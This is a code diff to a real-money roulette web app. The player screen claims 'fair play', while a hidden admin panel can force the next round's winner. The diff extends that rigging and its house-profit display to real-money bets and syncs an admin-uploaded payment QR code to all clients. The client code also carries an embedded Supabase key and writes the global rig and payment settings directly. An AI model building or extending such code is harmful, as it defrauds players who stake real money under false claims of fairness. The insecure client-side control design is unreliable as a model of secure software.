@@ -115,8 +115,8 @@
         #comingSoonNoticeModal { display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.88); z-index: 70000; align-items: center; justify-content: center; }
         .coming-soon-card { background: linear-gradient(135deg, #0b2d13, #021207); border: 4px solid #ffd700; padding: 24px; border-radius: 20px; width: 320px; text-align: center; color: #fff; box-shadow: 0 0 60px #ffd700; animation: popupScale 0.3s ease-out; }
 
-        /* मेंटेनेंस मोड ग्लोबल पॉप-अप स्क्रीन */
         #globalMaintenanceOverlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.98); z-index: 999999; flex-direction: column; align-items: center; justify-content: center; color: #fff; text-align: center; padding: 20px; }
+        #networkErrorOverlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.95); z-index: 999998; flex-direction: column; align-items: center; justify-content: center; color: #e74c3c; text-align: center; padding: 20px; }
 
         #secretAdminModal { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: radial-gradient(circle at center, #051a0a 0%, #000502 100%); z-index: 2147483647 !important; padding: 15px; text-align: center; color: #fff; overflow-y: auto; pointer-events: auto !important; }
         .admin-dashboard-container { max-width: 900px; margin: 15px auto; background: rgba(2, 15, 6, 0.98); border: 2px solid #ffd700; border-radius: 20px; padding: 25px; box-shadow: 0 0 80px rgba(255, 215, 0, 0.4), inset 0 0 30px rgba(0,0,0,0.9); display: flex; flex-direction: column; gap: 16px; text-align: left; }
@@ -151,11 +151,14 @@
 </head>
 <body>
 
-    <!-- मेंटेनेंस मोड स्क्रीन -->
     <div id="globalMaintenanceOverlay">
-        <h1 style="color:#e74c3c; font-size:28px; margin-bottom:12px;">🛠️ APP UNDER SCHEDULED MAINTENANCE</h1>
-        <p style="font-size:14px; color:#fff; margin-bottom:8px;">Our system is getting optimized for a smoother experience.</p>
-        <p id="maintenanceTimerCountdown" style="font-size:18px; color:#ffd700; font-weight:bold; margin-top:10px;">Auto resuming soon...</p>
+        <h1 style="color:#e74c3c; font-size:26px; margin-bottom:10px;">🛠️ SYSTEM MAINTENANCE</h1>
+        <p style="font-size:13px; color:#fff;" id="maintenanceTimerCountdown">Resuming shortly...</p>
+    </div>
+
+    <div id="networkErrorOverlay">
+        <h1 style="color:#e74c3c; font-size:24px; margin-bottom:10px;">⚠️ REAL CONNECTION LOST</h1>
+        <p style="font-size:12px; color:#fff;">Unable to reach Cloud Server. Reconnecting...</p>
     </div>
 
     <!-- ऑडियो एलिमेंट्स -->
@@ -175,7 +178,6 @@
             <p style="font-size:11px; color:#fff; font-weight:bold; margin-bottom:6px;">100% चीटिंग रहित (FAIR PLAY & SECURE)</p>
             <div style="background:linear-gradient(135deg, #c0392b, #8e44ad); color:#fff; font-size:11px; font-weight:900; padding:6px; border-radius:6px; margin-bottom:8px; text-transform:uppercase;">🔥 7 PLAYER LIVE TABLE 🔥</div>
             <div style="background:linear-gradient(135deg, #27ae60, #1e8449); color:#fff; font-size:12px; font-weight:900; padding:6px; border-radius:6px; margin-bottom:12px; text-transform:uppercase;">🃏 TEEN PATTI - COMING SOON 🃏</div>
-            <p style="font-size:9px; color:#ddd; margin-bottom:15px; line-height:1.4;">Experience lightning-fast gameplay, zero lag & instant payouts!</p>
             <button onclick="closeComingSoonModal(); playMasterAudio();" style="background:linear-gradient(135deg, #ffd700, #b8860b); color:#000; border:none; padding:10px 24px; border-radius:8px; font-weight:900; font-size:12px; cursor:pointer; text-transform:uppercase; box-shadow:0 0 15px #ffd700;">Enter Royal Roulette</button>
         </div>
     </div>
@@ -333,7 +335,7 @@
     <div id="secretAdminModal">
         <div class="admin-dashboard-container">
             <div class="admin-top-header">
-                <h2>👑 MASTER ADMIN A-Z COMMAND CENTER (100% CLOUD)</h2>
+                <h2>👑 MASTER ADMIN A-Z COMMAND CENTER (100% CLOUD-LOCKED)</h2>
                 <button onclick="document.getElementById('secretAdminModal').style.display='none'" style="background: #e74c3c; color: #fff; border: none; padding: 8px 16px; border-radius: 8px; font-size: 12px; font-weight: bold; cursor: pointer;">✕ Close</button>
             </div>
 
@@ -351,13 +353,12 @@
             </div>
 
             <div class="admin-kpi-grid">
-                <div class="kpi-card"><div class="kpi-title">Active Players</div><div class="kpi-value" id="admActivePlayers" style="color:#2ecc71;">LIVE</div></div>
+                <div class="kpi-card"><div class="kpi-title">Active Real Players</div><div class="kpi-value" id="admActivePlayers" style="color:#2ecc71;">LIVE</div></div>
                 <div class="kpi-card purple"><div class="kpi-title">Current Round ID</div><div class="kpi-value" id="admRoundId" style="color:#f1c40f;">Round #1</div></div>
-                <div class="kpi-card orange"><div class="kpi-title">House Profit (5%)</div><div class="kpi-value" id="admProfit" style="color:#ffd700;">₹0</div></div>
-                <div class="kpi-card blue"><div class="kpi-title">Safe Pool (95%)</div><div class="kpi-value" id="admPool" style="color:#3498db;">₹0</div></div>
+                <div class="kpi-card orange"><div class="kpi-title">Real House Profit (5%)</div><div class="kpi-value" id="admProfit" style="color:#ffd700;">₹0</div></div>
+                <div class="kpi-card blue"><div class="kpi-title">Real Safe Pool (95%)</div><div class="kpi-value" id="admPool" style="color:#3498db;">₹0</div></div>
             </div>
 
-            <!-- मेंटेनेंस टाइमर कंट्रोल पैनल -->
             <div class="admin-section-box" style="border: 1.5px solid #e74c3c;">
                 <div class="admin-section-title"><span style="color: #e74c3c;">🛠️ App Maintenance Mode & Timer Control</span></div>
                 <div style="display:flex; gap:8px; margin-bottom:8px; align-items:center;">
@@ -382,8 +383,8 @@
             </div>
 
             <div class="admin-section-box" style="border: 1.5px solid #2ecc71;">
-                <div class="admin-section-title"><span style="color: #2ecc71;">👥 All Users Live Activity & Bets Monitoring</span></div>
-                <div id="admUsersActivityList" style="font-size:11px; color:#ccc; max-height: 120px; overflow-y: auto;">Monitoring active user sessions and bets...</div>
+                <div class="admin-section-title"><span style="color: #2ecc71;">👥 Real Players Live Activity & Real Bets Monitoring</span></div>
+                <div id="admUsersActivityList" style="font-size:11px; color:#ccc; max-height: 120px; overflow-y: auto;">Monitoring real user sessions and bets...</div>
             </div>
 
             <div class="admin-section-box">
@@ -401,7 +402,7 @@
             </div>
 
             <div class="admin-section-box">
-                <div class="admin-section-title"><span>⚙️ Global Cloud Override / Rig Next Round</span></div>
+                <div class="admin-section-title"><span>⚙️ Global Cloud Override / Rig Next Round (Real Mode Only)</span></div>
                 <select id="adminRigSelect" style="margin-bottom: 10px;">
                     <option value="random">Auto 5% House Margin Safe Engine (No Loss)</option>
                 </select>
@@ -464,7 +465,7 @@
         </div>
     </div>
 
-    <!-- ट्रांसफर मोडल (10% टैक्स) -->
+    <!-- ट्रांसफर मोडल -->
     <div id="transferModalBox" class="wallet-modal">
         <div class="wallet-modal-content">
             <h3 style="color:#f1c40f; margin-bottom:8px; font-size:18px;">TRANSFER COINS (10% TAX)</h3>
@@ -481,16 +482,6 @@
             try {
                 const socket = io("https://roulette-game-3.onrender.com");
 
-                socket.on('sync_game_state', function(data) {
-                    if (data) {
-                        if (data.adminRig) window.cloudSyncStore.adminRig = data.adminRig;
-                        if (data.maintenanceUntil) {
-                            window.cloudSyncStore.maintenanceUntil = data.maintenanceUntil;
-                            checkGlobalMaintenanceStatus();
-                        }
-                    }
-                });
-
                 const SUPABASE_URL = "https://fifqewznpxllackprwut.supabase.co";
                 const SUPABASE_KEY = "sb_publishable_Oh2OjV9trsWZ0RXFxvrn_Q_9Km13JPT";
                 const sbClient = (typeof window.supabase !== 'undefined') ? window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY) : null;
@@ -506,6 +497,7 @@
                 let loggedUserPhone = "", loggedVipId = "RD001001";
                 let isGameSpinning = false, userActiveBets = {}, currentTotalBet = 0, betHistoryStack = [];
                 let isAdminLoggedIn = false;
+                let failedCloudPings = 0;
                 
                 window.cloudSyncStore = {
                     currentWinner: 14,
@@ -526,31 +518,69 @@
                 if (sbClient) {
                     async function fetchGlobalCloudState() {
                         try {
-                            let { data } = await sbClient.from('game_state').select('value').eq('key', 'global_config').single();
+                            let { data, error } = await sbClient.from('game_state').select('value').eq('key', 'global_config').single();
+                            if (error) throw error;
                             if (data && data.value) {
+                                failedCloudPings = 0;
+                                document.getElementById('networkErrorOverlay').style.display = 'none';
                                 let parsed = JSON.parse(data.value);
                                 if (parsed) {
+                                    if (parsed.history && Array.isArray(parsed.history)) {
+                                        window.cloudSyncStore.historyList = parsed.history;
+                                    }
                                     if (parsed.rig) window.cloudSyncStore.adminRig = parsed.rig;
-                                    if (parsed.maintenanceUntil) {
+                                    if (parsed.qrUrl) {
+                                        window.cloudSyncStore.adminQrUrl = parsed.qrUrl;
+                                        updateActiveQrDisplay();
+                                    }
+                                    if (parsed.maintenanceUntil !== undefined) {
                                         window.cloudSyncStore.maintenanceUntil = parsed.maintenanceUntil;
                                         checkGlobalMaintenanceStatus();
                                     }
                                 }
                             }
-                        } catch(e) {}
+                        } catch(e) {
+                            failedCloudPings++;
+                            if (failedCloudPings >= 6) {
+                                document.getElementById('networkErrorOverlay').style.display = 'flex';
+                            }
+                        }
                     }
                     setInterval(fetchGlobalCloudState, 1500);
 
                     window.publishToCloudMaster = async function(winnerNum, histArr, rigVal, qrVal, maintVal) {
                         try {
-                            let payload = { winner: winnerNum, history: histArr, rig: rigVal, qrUrl: qrVal, maintenanceUntil: maintVal || window.cloudSyncStore.maintenanceUntil };
+                            let payload = { 
+                                winner: winnerNum, 
+                                history: histArr, 
+                                rig: rigVal, 
+                                qrUrl: qrVal || window.cloudSyncStore.adminQrUrl, 
+                                maintenanceUntil: maintVal !== undefined ? maintVal : window.cloudSyncStore.maintenanceUntil 
+                            };
                             await sbClient.from('game_state').upsert([
                                 { key: 'global_config', value: JSON.stringify(payload) }
                             ], { onConflict: 'key' });
-                            socket.emit('admin_update_command', { adminRig: rigVal, adminQrUrl: qrVal, maintenanceUntil: payload.maintenanceUntil });
+                            socket.emit('admin_update_command', payload);
                         } catch(e) {}
                     };
                 }
+
+                socket.on('sync_game_state', function(data) {
+                    if (data) {
+                        failedCloudPings = 0;
+                        document.getElementById('networkErrorOverlay').style.display = 'none';
+                        if (data.history && Array.isArray(data.history)) window.cloudSyncStore.historyList = data.history;
+                        if (data.rig) window.cloudSyncStore.adminRig = data.rig;
+                        if (data.qrUrl) {
+                            window.cloudSyncStore.adminQrUrl = data.qrUrl;
+                            updateActiveQrDisplay();
+                        }
+                        if (data.maintenanceUntil !== undefined) {
+                            window.cloudSyncStore.maintenanceUntil = data.maintenanceUntil;
+                            checkGlobalMaintenanceStatus();
+                        }
+                    }
+                });
 
                 function checkGlobalMaintenanceStatus() {
                     let overlay = document.getElementById('globalMaintenanceOverlay');
@@ -559,7 +589,7 @@
                     if (window.cloudSyncStore.maintenanceUntil && now < window.cloudSyncStore.maintenanceUntil) {
                         let diffSec = Math.floor((window.cloudSyncStore.maintenanceUntil - now) / 1000);
                         let min = Math.floor(diffSec / 60), sec = diffSec % 60;
-                        if (countdown) countdown.innerText = `App will resume automatically in ${min}m ${sec}s`;
+                        if (countdown) countdown.innerText = `App under maintenance. Resuming in ${min}m ${sec}s`;
                         if (overlay) overlay.style.display = 'flex';
                     } else {
                         if (overlay) overlay.style.display = 'none';
@@ -569,17 +599,13 @@
 
                 window.applyMaintenanceCommand = function() {
                     let selectVal = parseInt(document.getElementById('adminMaintenanceDuration').value);
-                    if (selectVal === 0) {
-                        window.cloudSyncStore.maintenanceUntil = 0;
-                        alert("✅ Maintenance Mode Turned Off!");
-                    } else {
-                        let durationMs = selectVal * 60 * 1000;
-                        window.cloudSyncStore.maintenanceUntil = Date.now() + durationMs;
-                        alert(`✅ Maintenance Mode Set for ${selectVal} Minutes!`);
-                    }
+                    let durationMs = selectVal === 0 ? 0 : (selectVal * 60 * 1000);
+                    window.cloudSyncStore.maintenanceUntil = durationMs === 0 ? 0 : (Date.now() + durationMs);
+                    
                     if (window.publishToCloudMaster) {
                         window.publishToCloudMaster(window.cloudSyncStore.currentWinner, window.cloudSyncStore.historyList, window.cloudSyncStore.adminRig, window.cloudSyncStore.adminQrUrl, window.cloudSyncStore.maintenanceUntil);
                     }
+                    alert(selectVal === 0 ? "✅ Maintenance turned off!" : `✅ Maintenance set for ${selectVal} mins!`);
                     document.getElementById('secretAdminModal').style.display = 'none';
                 };
 
@@ -596,7 +622,7 @@
                         window.cloudSyncStore.adminQrUrl = e.target.result;
                         updateActiveQrDisplay();
                         if(window.publishToCloudMaster) window.publishToCloudMaster(window.cloudSyncStore.currentWinner, window.cloudSyncStore.historyList, window.cloudSyncStore.adminRig, e.target.result, window.cloudSyncStore.maintenanceUntil);
-                        alert("✅ QR Code Saved!");
+                        alert("✅ QR Code Updated Worldwide!");
                     };
                     reader.readAsDataURL(fileInput.files[0]);
                 };
@@ -622,13 +648,12 @@
                     return Math.floor(nowSec / ROUND_TIME);
                 }
 
-                // 5% हाउस मार्जिन और 95% सेफ पूल इंजन (नो-लॉस)
                 function getSmartWinnerForRound(roundId) {
                     if (window.cloudSyncStore.adminRig !== "random") {
                         let parsedNum = parseInt(window.cloudSyncStore.adminRig);
                         if (!isNaN(parsedNum)) return parsedNum;
                     }
-                    let totalTableBet = currentTotalBet || 100;
+                    let totalTableBet = (activeGameMode === 'real') ? (currentTotalBet || 100) : 100;
                     let houseProfit = totalTableBet * 0.05;
                     let safePayoutPool = totalTableBet * 0.95;
 
@@ -645,8 +670,8 @@
                     
                     let profitEl = document.getElementById('admProfit');
                     let poolEl = document.getElementById('admPool');
-                    if (profitEl) profitEl.innerText = "₹" + houseProfit.toFixed(1);
-                    if (poolEl) poolEl.innerText = "₹" + safePayoutPool.toFixed(1);
+                    if (profitEl && activeGameMode === 'real') profitEl.innerText = "₹" + houseProfit.toFixed(1);
+                    if (poolEl && activeGameMode === 'real') poolEl.innerText = "₹" + safePayoutPool.toFixed(1);
 
                     return chosenWinner;
                 }
@@ -715,7 +740,8 @@
 
                     let activityEl = document.getElementById('admUsersActivityList');
                     if(activityEl) {
-                        activityEl.innerHTML = `<div>Active User: ${loggedUserPhone || 'Guest'} | VIP ID: ${loggedVipId} | Active Mode: ${activeGameMode.toUpperCase()} | Total Bet: ₹${currentTotalBet}</div>`;
+                        let displayBet = (activeGameMode === 'real') ? currentTotalBet : 0;
+                        activityEl.innerHTML = `<div>Active Real User: ${loggedUserPhone || 'Guest'} | VIP ID: ${loggedVipId} | Mode: REAL MONEY | Real Bet: ₹${displayBet}</div>`;
                     }
                 }
 
@@ -758,8 +784,13 @@
                     drawCanvasWheel('lobbyWheelCanvas'); 
                     updateActiveQrDisplay();
                 };
+
+                // फिक्स: पॉप-अप को हटाने वाला फंक्शन और ऑडियो चालू करना
                 window.closeComingSoonModal = function() { 
-                    document.getElementById('comingSoonNoticeModal').style.display = 'none'; 
+                    let modal = document.getElementById('comingSoonNoticeModal');
+                    if (modal) {
+                        modal.style.display = 'none';
+                    }
                     playMasterAudio();
                 };
 
